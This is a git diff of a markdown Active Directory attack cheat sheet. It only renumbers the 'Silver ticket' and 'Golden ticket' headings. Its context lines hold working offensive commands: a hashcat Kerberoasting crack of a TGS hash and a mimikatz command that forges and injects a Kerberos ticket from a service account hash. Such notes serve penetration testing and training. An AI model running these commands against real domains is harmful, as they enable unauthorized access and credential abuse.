@@ -480,7 +480,7 @@ hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt
 
 ### 8.5. Getting tickets
 
-#### [Silver ticket](/attacking-active-directory.md#43-silver-ticket)
+#### 8.5.1. [Silver ticket](/attacking-active-directory.md#43-silver-ticket)
 
 ```cmd
 whoami /user
@@ -489,7 +489,7 @@ mimikatz # kerberos::purge
 mimikatz # kerberos::golden /user:$USERNAME /domain:$DOMAIN /sid:$DOMAIN_SID /id:$USER_SID /target:$TARGET /service:$SERVICE /rc4:$SERVICE_ACCOUNT_PASSWORD_HASH /ptt
 ```
 
-#### [Golden ticket](/attacking-active-directory.md#5-golden-ticket)
+#### 8.5.2. [Golden ticket](/attacking-active-directory.md#5-golden-ticket)
 
 Option 1: `impacket`
 
